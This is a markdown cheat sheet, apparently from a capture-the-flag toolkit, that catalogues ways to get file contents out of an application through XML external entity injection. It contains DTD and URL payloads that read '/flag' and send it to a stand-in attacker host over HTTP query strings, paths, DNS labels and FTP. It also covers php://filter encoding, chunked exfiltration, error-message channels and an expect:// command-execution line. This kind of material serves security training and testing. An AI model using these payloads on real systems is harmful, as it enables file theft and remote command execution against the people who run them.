# Exfil Techniques — every channel for getting content out

## The two-channel model — in-band vs out-of-band

- **In-band** — the entity-substituted content lands in the HTTP
  response you already have — the echo, the attribute, the error
- **OOB** — a network fetch carries it to you — the listener hit

## In-band channels

### The body echo

`<r>&x;</r>` → the `<r>` text contains the file — the cleanest.

### The attribute echo

```xml
<r a="&x;"/>
<!ATTLIST r a CDATA "&x;">
```

The DOM attribute — the app's serialization shows it.

### The error echo

`file:///nonexistent/<content>` → `FileNotFound` URI — `errors-deep.md`.

### The element-name echo — niche

`<x&y;>` — an entity inside a tag-name — fails well-formedness —
but the parse-error may carry the name.

### The DOM-re-serialization — the app's own output

The app parses → DOM → re-serializes → the expanded content is in the
output — the app's own output is the channel.

### The `view-source`/`debug`-page — the app's raw view

If the app exposes a `?debug`/`view-source`/`raw` view — the raw
substituted doc lands there.

## OOB channels — the fetch-is-the-message

### HTTP query — `http://YOU/?d=<content>`

The content in `?d=` — `oob_listener.py` logs it.

### HTTP path — `http://YOU/<content>`

The content in the path — survives `?`/`&` in content.

### DNS — `http://<content>.YOU/`

The content as a DNS label — only short clean content — UDP-53
egress.

### FTP — `ftp://YOU/<content>`

The content in the FTP command — raw socket listener.

### The `Location:`/redirect — the app follows

The app fetches `http://YOU/a` → your listener 302s → the hop re-sends.

### The `Referer`/`User-Agent` — secondary channel

A fetch the app makes may carry a Referer built from your URL.

## The size problem — the URL/label limit

- HTTP query — ~8KB before some servers 414
- DNS label — ≤63 chars, alnum+dash
- the content is bigger → slice it or base64 it

### The `php://filter` encode-in-URI — the URL-safe trick

```dtd
<!ENTITY % f SYSTEM "php://filter/convert.base64-encode/resource=/flag">
```

b64 is URL-safe — the whole file fits a query param.

### The `zlib.deflate` + `base64` — the shrink

```dtd
php://filter/zlib.deflate/convert.base64-encode/resource=/flag
```

### The `iconv`-charset trick — the oracle family

`convert.iconv.X.Y` — charset-transform the content — some transforms
are destructive (the byte-count changes with content) — a side-channel
oracle via output length.

## The chunked read — the file is too big for one URL

Read it in slices — the exfil-DTD builds a URL per slice:

```dtd
<!ENTITY % f1 SYSTEM "file:///flag">
<!ENTITY % w1 "<!ENTITY s SYSTEM 'http://YOU/?i=1&d=%f1;'>">
```

A multi-part exfil — reassemble at the listener.

## The "the content is the entity NAME" — the name-channel

`<!ENTITY %f; ...>` — the file content becomes an entity NAME —
`Entity '<content>' not defined` — the error carries the name —
only for short clean content.

## The "the content is the URL-path" — the path-channel

`http://YOU/%f;` — content in path — survives `?`/`&`.

## The "the content is in the Host" — the host-channel

`http://%f;.YOU/` — content in hostname — DNS-label rules.

## The "the app makes the request itself" — the delegated-fetch

A fetch you triggered via a different feature (a "check this URL" tool)
— the fetch itself carries the content — a delegated OOB.

## The `expect://` exec-channel — the command-out

```
expect://cat%20/flag | base64
```

The command output is the entity value — the exec's stdout is the
channel — `xxe-to-rce.md`.

## The "the flag is short" — the DNS-label shortcut

A 32-char hex flag fits a DNS label perfectly — `http://%f;.YOU/` is
the minimal exfil for flag-shaped content — no `php://filter` needed.

## The "the listener is the single source of truth" — the canary

`oob_listener.py canary` — embed a unique token — `hits` output proves
your payload fired — the OOB evidence standard.

## The "the app has no egress AND no echo" — the last-channel

If no echo AND no egress — the error-channel (`file:///nonexistent/%f;`)
is the last resort — the file content lands in the parser's own error.
If errors are suppressed — the class is dead for reading; the fetch
still fires (SSRF is separate).
